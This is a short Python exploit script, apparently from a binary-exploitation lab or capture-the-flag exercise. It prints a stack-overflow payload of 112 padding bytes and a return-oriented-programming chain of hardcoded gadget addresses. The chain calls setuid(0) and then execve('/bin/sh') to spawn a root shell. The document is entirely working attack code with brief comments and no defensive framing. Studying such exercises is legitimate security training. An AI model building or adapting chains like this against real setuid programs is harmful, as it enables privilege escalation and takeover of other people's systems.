from shellcode import shellcode
import sys



sys.stdout.buffer.write(b'A'*(112) + # b'/bin/sh' + # b'//sh' +
                        # setuid section
                        0x080563d0.to_bytes(4, 'little') + # set eax to 0
                        (0x0805e8ad.to_bytes(4, "little") * 23) + #inc eax to 23
                        
                        0x080481d1.to_bytes(4, "little") + # reset ebx to 0
                        0xffffffff.to_bytes(4, "little") + # set ebx to max
                        0x0805e27b.to_bytes(4, "little") + # overflow by 1 so it wraps around to 0
                        0x080732cf.to_bytes(4, 'little') + # call int 0x80

                        # execve section - works
                        0x08096740.to_bytes(4, 'little') +  # set eax to 7
                        0x0807fe39.to_bytes(4, 'little') + # inc eax to 8
                        0x0807fe39.to_bytes(4, 'little') + # inc eax to 9
                        0x0807fe39.to_bytes(4, 'little') + # inc eax to 10
                        0x0807fe39.to_bytes(4, 'little') + # inc eax to 11

                        0x080481d1.to_bytes(4, 'little') + # set ebx to address of /bin/sh
                        0xfff6cd0c.to_bytes(4, 'little') + # address of /bin/sh on stack
                        
                        0x08056485.to_bytes(4, 'little') + # set edx to 0xffffffff
                        0x0805e085.to_bytes(4, 'little') + # inc edx to 0
                        0x0806f13c.to_bytes(4, 'little') + # set ecx to 0xffffffff
                        0x08094141.to_bytes(4, 'little') + # inc ecx to 0

                        0x080732d0.to_bytes(4, 'little') + # call int 0x80
                        b"/bin/sh"
                        )
